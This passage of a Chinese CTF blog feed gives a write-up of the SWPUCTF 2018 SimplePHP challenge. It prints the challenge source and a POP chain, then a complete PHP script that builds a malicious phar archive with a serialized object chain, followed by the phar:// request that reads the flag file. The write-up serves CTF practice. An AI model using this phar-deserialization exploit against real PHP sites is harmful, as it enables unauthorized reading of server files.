punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>base.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>web3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-default<span class="token punctuation">"</span></span> <span class="token attr-name">role</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navigation<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbra-toggle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file.php?file=<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>查看文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_file.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>上传文件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav navbar-nav navbar-right<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>glyphicon glyphicon-user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--flag is in f1ag.php--></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>然后就是枯燥的代码审计了。</p><p><code>file.php?file=function.php</code>看看文件上传的逻辑</p><p>对于后缀名进行了限制：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163755044.png" alt="image-20210710163755044"></p><p>将文件名+IP地址用MD5加密再加上jpg，移动到upload目录下：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163551428-1625906151804.png" alt="image-20210710163551428"></p><p><code>file.php?file=class.php</code></p><p>检测相关字样：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710163956441.png" alt="image-20210710163956441"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710164113934.png" alt="image-20210710164113934"></p><p>似乎是提示：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710164440808.png" alt="image-20210710164440808"></p><p>没有<code>unserialize()</code>调用，又有序列化函数，还有文件上传，可猜是phar题。</p><p>所以接下来得找pop链。</p><h3 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h3><p>pop链构造逻辑：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">Test</span><span class="token operator">::</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">Show</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">-</span> <span class="token class-name static-context">C1e4r</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload如下，记得设置php.ini中<code>phar.readonly = Off</code>，否则会报错。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//可触发__toString()</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span> <span class="token comment">//可触发__get()</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/var/www/html/f1ag.php'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的phar.phar改成图片后缀：<code>phar.gif</code>,上传</p><p>先根据之前所说的文件名字生成规则找到名字，后面要加个.jpg.</p><pre class="line-numbers language-none"><code class="language-none">521e5ec0fb0fcaa79e19216b5f5342b9.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>貌似文件目录直接就开着的，<code>/upload/</code>可以直接浏览</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710215959026.png" alt="image-20210710215959026"></p><p>最后提交payload：</p><pre class="line-numbers language-none"><code class="language-none">file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;521e5ec0fb0fcaa79e19216b5f5342b9.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPUCTF-2018-SimplePHP/image-20210710215013999.png" alt="image-20210710215013999"></p><p>解密一下，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> Phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GYCTF2020]Ezsqli</title>
      <link href="/p/1354079185.html"/>
      <url>/p/1354079185.html</url>
      
